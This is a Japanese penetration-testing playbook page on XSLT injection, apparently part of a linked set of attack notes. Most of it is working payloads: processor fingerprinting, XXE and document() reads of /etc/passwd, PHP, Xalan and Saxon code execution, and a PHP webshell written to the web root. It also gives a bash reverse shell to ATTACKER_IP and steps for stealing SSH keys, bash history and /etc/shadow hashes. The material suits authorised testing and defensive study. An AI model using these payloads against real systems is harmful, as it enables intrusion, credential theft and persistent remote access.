## XSLTインジェクション

### 着火条件
- WebアプリがXSLTファイルのアップロードまたは指定を受け付けている
- アプリがXMLとXSLTを組み合わせてサーバー側で変換処理を行っている（例：nmapのXML結果を整形してHTML表示する機能）
- カスタムXSLTの内容がサーバー側で実行されている（出力にXSLTの評価結果が反映される）

### 環境前提
- 実行環境: テスター端末（ペイロード作成）/ ターゲット（XSLT処理実行）
- 必要なツール: テキストエディタ、Burp Suite（任意）
- 特別なインストール不要。XSLTファイルを手動で作成して送信する
- オフライン代替: ペイロード作成はオフラインで完結する

### 観点・着眼点

**先に確認すること：**

- アプリがXSLTファイルのアップロードを受け付けているか、またはXSLTを選択・指定できるか
- レスポンスにXSLT変換の出力が含まれているか（エラーメッセージも手がかり）
- エラーメッセージにXSLTプロセッサ名・バージョンが含まれていないか

**シグナルと次の手：**

- `system-property()` が正常に値を返す → XSLTインジェクション成立を確認。プロセッサを特定して攻撃面を選ぶ
- `Entity 'xxx' not defined` エラー → XSLTのDOCTYPEでエンティティを宣言していない（手順②のXXE-via-XSLT参照）
- `Cannot resolve URI` → `document()` によるファイル読み込みが制限されている。別の手法へ移行
- `XPath evaluation returned no result` → PHP名前空間拡張が無効（`registerPHPFunctions()` 未呼び出し）
- `Exploit Attempted` のみ表示 → WAFまたはアプリ側のシグネチャ検出。別のXSLT構文・別機能を探す

**XSLTプロセッサ別の攻撃面：**

| プロセッサ | フィンガープリント値 | 主な攻撃面 |
|-----------|---------------------|-----------|
| libxslt（C）| `vendor-url: http://xmlsoft.org/XSLT/` | XXE-via-XSLT（libxml2の設定依存）。`document()` は多くのビルドでブロック |
| Saxon（Java）| `vendor: SAXON`・バージョン番号が出る | XSLT 2.0/3.0対応。`unparsed-text()` が使える場合がある |
| Xalan（Java）| `vendor: Apache Software Foundation` | Java拡張要素（`xalan:component`）が有効な場合にRCEが可能 |
| .NET XslCompiledTransform | `vendor: Microsoft` | `msxsl:script` 拡張が有効ならC#コード実行 |

### 手順

**① プロセッサのフィンガープリント（最初に必ず実施）**

> **操作の前提**：アプリがXMLとXSLTを両方アップロードする仕組みの場合、**元のXMLファイルはそのまま使い、XSLTファイルだけを差し替えてアップロードする**。以降の②〜⑤も同様。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html>
      <body>
        <ul>
          <li>Vendor: <xsl:value-of select="system-property('xsl:vendor')"/></li>
          <li>Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')"/></li>
          <li>Version: <xsl:value-of select="system-property('xsl:version')"/></li>
        </ul>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

`system-property()` 関数は多くのプロセッサで制限されないため、最初のプローブとして使う。

**出力値の読み方と次の手：**

| 出力値 | 意味 | 次にやること |
|--------|------|------------|
| `Vendor URL: http://xmlsoft.org/XSLT/` | libxslt（C）。PHP連携の場合もある | ② → ④ → ⑦ → ③ の順で試す（⑦の `exsl:document` はビルド依存・EXSLT 有効ビルドで任意ファイル書込が刺さる。③ の `document()` はlibxsltでほぼブロックされるため最後） |
| `Vendor: SAXON` + edition が `Saxon-PE` / `Saxon-EE` | Saxon（Java）有償版。Java 拡張関数が有効 | ⑥ `saxon:evaluate` + `java.lang.Runtime` 経由 RCE が射程 |
| `Vendor: SAXON` + edition が `Saxon-HE` | Saxon（Java）無償版。Java 拡張関数なし | ③ `document()` / `unparsed-text()` でファイル読み・SSRF。RCE は版数 CVE に依存 |
| `Vendor: SAXON` のみ（edition 不明） | Saxon の古いバージョン | searchsploit / NVD でバージョン+CVEを確認。③ → ⑥ → ⑦ の順に試す |
| `Vendor: Apache Software Foundation` | Xalan（Java） | ⑤ Java拡張要素（`rt:exec`）を試す |
| `Vendor: Microsoft` | .NET XslCompiledTransform | `msxsl:script` 拡張（C#コード埋め込み）を試す |
| `Version: 1.0` | XSLT 1.0 のみ対応 | `unparsed-text()` 等の XSLT 2.0 機能は使えない |
| `Version: 2.0` / `3.0` | XSLT 2.0/3.0 対応（Saxon 系） | `unparsed-text('file:///etc/passwd')` を試す |

**② XXE-via-XSLT（libxslt を含む多くのプロセッサで試す）**

XSLTファイル自体のDOCTYPEでエンティティを宣言することでファイルを読み込む：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xsl:stylesheet [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html>
      <body>
        <pre>&xxe;</pre>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

> 原理 → `../../06_Concepts/XSLT_XML_Processing.md`

**ファイルが読めたら次にすること（②③④共通）：**

`/etc/passwd` の内容が取得できたら以下の順で展開する。

1. **有効なユーザーを特定する**：`/etc/passwd` は `username:x:uid:gid:comment:home:shell` の7フィールド構成。末尾（7番目）がシェルで、6番目がホームディレクトリ。

   ```
   alice:x:1001:1001::/home/alice:/bin/bash     ← 有効（/bin/bash）
   www-data:x:33:33::/var/www:/usr/sbin/nologin ← 除外（nologin）
   root:x:0:0:root:/root:/bin/bash              ← 有効（rootは特に重要）
   ```

2. **有効ユーザーの資産を読む**：
   - `file:///home/USERNAME/.ssh/id_rsa` — SSH 秘密鍵（あれば直接ログインへ）
   - `file:///home/USERNAME/.bash_history` — 過去コマンドに認証情報が残ることがある
3. **Webアプリ設定ファイルを読む**：アプリのドキュメントルート・設定ディレクトリはアプリ名で検索して特定する（`../../05_Tools_Reference/Searchsploit.md` の「製品構造調査」参照）
4. **`/etc/shadow` を読む**：読めた場合はユーザーのハッシュを取得してクラック → `../../05_Tools_Reference/Hashcat.md`

→ 取得した認証情報の確認手順 → `../Credential_Discovery.md`（パスワード使い回し確認の表）

**③ `document()` 関数によるファイル読み込み（Saxon等で有効な場合）**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <pre><xsl:copy-of select="document('file:///etc/passwd')"/></pre>
  </xsl:template>
</xsl:stylesheet>
```

`Cannot resolve URI /etc/passwd` が出る場合は `file:///etc/passwd` の形式も試す。

```xml
<!-- 相対パス形式でも試す -->
<xsl:copy-of select="document('/etc/passwd')"/>
```

※ libxslt 1.x は `document()` の外部URI（`file://`）を禁止しているビルドが多い。

**④ PHP名前空間拡張（PHP + libxslt の場合）**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <pre><xsl:value-of select="php:function('file_get_contents', '/etc/passwd')"/></pre>
  </xsl:template>
</xsl:stylesheet>
```

`XPath evaluation returned no result` が出る場合、`registerPHPFunctions()` が無効。

RCEを狙う場合は、`file_get_contents` の行を `system` / `passthru` に差し替えたXSLTファイルをアップロードする（`cmd=id` のようなURLパラメータは不要。XSLTの中に直接コマンドを書く）：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <pre><xsl:value-of select="php:function('system', 'id')"/></pre>
  </xsl:template>
</xsl:stylesheet>
```

コマンドを変えたい場合は `'id'` の部分を `'whoami'` や `'cat /etc/passwd'` に書き換えて都度アップロードする。リバースシェルを引き込む場合は `'id'` の位置にシェルのペイロードを入れる（`bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'` 等）。

> シェル取得後の安定化 → `../../03_Post_Access_Linux/Shell_Stabilization.md`

**⑤ Javaプロセッサ（Xalan）での拡張要素によるRCE**

```xml
<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
                version="1.0">
  <xsl:template match="/">
    <xsl:value-of select="rt:exec(rt:getRuntime(), 'id')"/>
  </xsl:template>
</xsl:stylesheet>
```

**⑥ Saxon-PE / Saxon-EE の Java extension functions による RCE**

Saxon-HE（無償版）には Java 拡張関数は無いが、**Saxon-PE / Saxon-EE では Java の `java.lang.*` を XSLT から呼び出せる** (`saxon:evaluate` / `saxon:expression` / インライン Java 拡張) ため RCE 経路になる。`system-property('xsl:vendor')` のフィンガープリント時に Saxon の edition（HE / PE / EE）を判別する手がかりはバージョン文字列の末尾。

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="2.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:saxon="http://saxon.sf.net/"
                xmlns:Runtime="java:java.lang.Runtime">
  <xsl:template match="/">
    <!-- saxon:evaluate で動的に XPath / XQuery 式を評価 → 拡張関数経由でコマンド実行 -->
    <xsl:value-of select="saxon:evaluate('Runtime:exec(Runtime:getRuntime(), &quot;id&quot;)')"/>
  </xsl:template>
</xsl:stylesheet>
```

エラーで `Cannot find a 1-argument function named saxon:evaluate` が出る場合は Saxon-HE（拡張関数なし）の可能性。Saxon-PE / EE の場合のみ刺さる。`system-property('xsl:product-name')` で `Saxon-EE` / `Saxon-PE` の文字列が見えるかを最初に確認。

**⑦ libxslt の `exsl:document` / `xsl:result-document` による任意ファイル書込**

EXSLT（`http://exslt.org/common`）拡張がビルドに含まれている libxslt では、**仕様上の機能**として `exsl:document` で任意パスにファイルを書き出せる（脆弱性ではなくドキュメント化された機能）。libxslt 側の security framework で `xsltSetSecurityPrefs()` を使うか、`xsltproc --nowrite` 相当の設定でブロック可能だが、デフォルトで有効なケースや明示的に無効化していないラッパーでは攻撃に使える。XSLT 2.0 系（Saxon）では `xsl:result-document` が同等の機能を持つ。書込先に Web ルートを指定すれば webshell 設置が可能。

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:exsl="http://exslt.org/common"
                extension-element-prefixes="exsl">
  <xsl:template match="/">
    <!-- libxslt + EXSLT 有効ビルド: 任意パスに任意内容のファイルを書込 -->
    <exsl:document href="/var/www/html/shell.php" method="text">
      <xsl:text>&lt;?php system($_GET['c']); ?&gt;</xsl:text>
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>
```

```xml
<!-- XSLT 2.0 (Saxon) 版: xsl:result-document -->
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:result-document href="file:///var/www/html/shell.php" method="text">
      <xsl:text>&lt;?php system($_GET['c']); ?&gt;</xsl:text>
    </xsl:result-document>
  </xsl:template>
</xsl:stylesheet>
```

書込が成立したら `curl http://[TARGET]/shell.php?c=id` で確認。**任意ファイル書込は不可逆操作**なので、書込先・ファイル名は kedalab テスト識別子 (`kedalab-[CASE_ID]_shell.php` 等) を含めて原状回復で grep 削除しやすくする。

### 刺さらなかったとき

- `system-property()` も出力されない・静的HTMLだけ返る → XSLTはサーバー側で実行されていない。アップロードしたXSLTの内容がそのまま保存されるだけ（ストレージへのパストラバーサル等を検討する）
- すべての試みで `Exploit Attempted` のみ表示される → WAF・アプリシグネチャが検出している。アップロード以外の攻撃面（他パラメータ・他機能）を探す
- libxslt で `document()` も XXE-via-XSLT もブロックされる → libxslt のセキュアビルドの可能性が高い。外部URL向けSSRFへの転換（`document('http://ATTACKER_IP:8000/')` で疎通確認）を試す
- Saxon/Xalan が確認できたのに拡張が使えない → クラスパスに必要なJARが含まれていない可能性。`system-property()` のバージョン情報を確認してCVEを調べる

### 注意点・落とし穴

- `&xxe;` と書いても `Entity 'xxe' not defined` エラーが出る場合は、XSLT内のDOCTYPEでエンティティを宣言していない。エンティティ宣言は `<!DOCTYPE xsl:stylesheet [...]>` の内側に書く
- `document()` の返り値はXMLノードセットなので、対象ファイルがXML形式でない場合はパースエラーになる。`<xsl:copy-of>` より `<xsl:value-of>` の方がテキストとして出力しやすい場合がある
- PHP名前空間ペイロードは `php:function()` が `registerPHPFunctions()` で明示的に有効化されていないと動かない
- WAFシグネチャを避けるためエンティティ名を変えても `Exploit Attempted` が出る場合は、ペイロードパターン全体（`document()`・`php:function` 等のキーワード）を疑う

### 関連技術
- 前：XMLアップロード機能の発見 → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：XXE（XMLのみでの攻撃） → `./XXE.md`
- 後：ファイル読み込みで認証情報取得 → `../Credential_Discovery.md`
- 後：SSRFへの転換（`document('http://...')` を使った内部ネットワーク探索）→ `./SSRF.md`
- 後：シェル取得後の安定化 → `../../03_Post_Access_Linux/Shell_Stabilization.md`
- 後：取得した /etc/shadow ハッシュのクラック → `../../05_Tools_Reference/Hashcat.md`
- 関連：製品構造調査・設定ファイルパスの特定 → `../../05_Tools_Reference/Searchsploit.md`
- 関連：XSLTプロセッサの動作原理・外部エンティティ処理 → `../../06_Concepts/XSLT_XML_Processing.md`
